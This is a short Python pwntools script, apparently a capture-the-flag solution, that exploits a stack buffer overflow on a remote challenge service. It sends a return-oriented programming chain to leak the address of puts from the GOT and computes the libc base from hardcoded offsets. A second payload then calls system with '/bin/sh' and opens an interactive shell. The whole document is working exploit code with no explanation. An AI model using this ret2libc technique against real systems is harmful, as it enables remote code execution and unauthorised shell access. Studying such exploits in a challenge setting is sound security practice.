#!/bin/python3

from pwn import *


poprdi = p64(0x40133b)
putsplt = p64(0x401030)
putsgot = p64(0x404018)
main_func = p64(0x401192)

payload1 = b"flag.txt\x00" + b"A"*47 + poprdi + putsgot + putsplt + main_func

p = remote('host1.metaproblems.com', 5152)

print(p.recvline())
p.sendline(payload1)
print(p.recvline())
p.sendline("/tmp/cosideciflag")
print(p.recvline())
puts_address = p.recvline().rstrip()


puts_address = int.from_bytes(puts_address, byteorder='little')
puts_offset = 0x071910
libc_base = puts_address - puts_offset


system_offset = 0x0449c0
system_addr = libc_base + system_offset
system = p64(system_addr)
binsh_offset = 0x181519
binsh_addr = libc_base + binsh_offset
binsh = p64(binsh_addr)

payload2 = b"flag.txt\x00" + b"A"*47 + poprdi + binsh + system

print(p.recvline())
p.sendline(payload2)
print(p.recvline())
p.sendline("/tmp/cosideciflag2")
print(p.recvline())


p.interactive()

